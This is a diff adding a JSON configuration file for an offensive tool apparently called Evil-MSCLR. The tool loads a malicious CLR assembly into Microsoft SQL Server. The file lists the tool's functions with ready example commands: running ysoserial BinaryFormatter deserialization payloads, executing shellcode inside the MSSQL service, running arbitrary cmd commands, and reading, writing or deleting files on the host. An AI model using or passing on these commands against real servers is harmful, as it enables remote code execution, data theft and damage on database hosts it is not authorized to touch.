@@ -1,0 +1,33 @@
+{
+    "host": "127.0.0.1",
+    "port": 1433,
+    "username": "USERNAME",
+    "password": "PASSWORD",
+
+    "assemblyname":"EvilMSCLR",
+    "assembly":"",
+    "procedure": "SqlStoredProcedure",
+
+    "functions":[
+        {
+            "name": "BinaryFormatter",
+            "description": "This function is used to execute serialized payloads.",
+            "example": "ysoserial.exe -f BinaryFormatter -g ResourceSet -o base64 -c 'cmd.exe /c echo hello > C:\\msg.txt'\n Evil-MSCLR.exe -loadassembly -function BinaryFormatter -argument 'base64 Payload'"
+        },
+        {
+            "name": "ShellCode",
+            "description": "This function is used to execute shellcode, may be unsafe and may cause MSSQL service to crash.",
+            "example": "Evil-MSCLR.exe -loadassembly -function ShellCode -argument 'base64 shellcode'"
+        },
+        {
+            "name": "Command",
+            "description": "This function is used to execute cmd commands, using this function will create a cmd process.",
+            "example": "Evil-MSCLR.exe -loadassembly -function Command -argument 'whoami'"
+        },
+        {
+            "name":"FileSystem",
+            "description": "This function is used to create, read, write, and delete files.",
+            "example": "Evil-MSCLR.exe -loadassembly -function FileSystem -argument 'read,c:\\Windows\\System32\\drivers\\etc\\hosts'"
+        }
+    ]
+}
